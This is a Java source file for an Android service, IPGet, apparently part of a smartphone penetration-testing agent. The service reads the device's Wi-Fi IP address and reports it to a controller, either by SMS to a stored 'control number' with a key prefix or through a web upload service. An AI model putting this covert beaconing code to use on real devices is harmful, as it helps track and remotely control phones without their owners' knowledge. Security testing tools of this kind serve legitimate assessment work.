package com.bulbsecurity.framework;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;


public class IPGet extends Service {

	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	@Override
	public void onStart(Intent intent, int startID) {
		String sms = "SMS";
		String web = "WEB";
		String ret = intent.getStringExtra("returnmethod");
		String ip = null;
		ConnectivityManager connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
		NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		if (mWifi.isConnected()) {
		WifiManager myWifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
		WifiInfo myWifiInfo = myWifiManager.getConnectionInfo();
		int ipaddress = myWifiInfo.getIpAddress();
		 String ipString = String.format("%d.%d.%d.%d",(ipaddress & 0xff),(ipaddress >> 8 & 0xff),(ipaddress >> 16 & 0xff),(ipaddress >> 24 & 0xff));
		 ip = ipString;
		}
		else {
			ip = "not connected";
		
		}
		if (ret != null)
		{
			 
			if (ret.equals(sms))
			{

		        
				Intent intent3 = new Intent(getApplicationContext(),SMSService.class);
				String key = getApplicationContext().getResources().getString(R.string.key);
				String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
				String first = key.concat(" ");
				String smsss = first.concat(ip);
				intent3.putExtra("number", number2);
				intent3.putExtra("message", smsss);
				Context context = getApplicationContext();
				context.startService(intent3);
				
			}
			else if (ret.equals(web))
			{
				Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
				intent2.putExtra("uploadstring", ip);
				Context context = getApplicationContext();
				context.startService(intent2);
			}
			
		}
	}


}

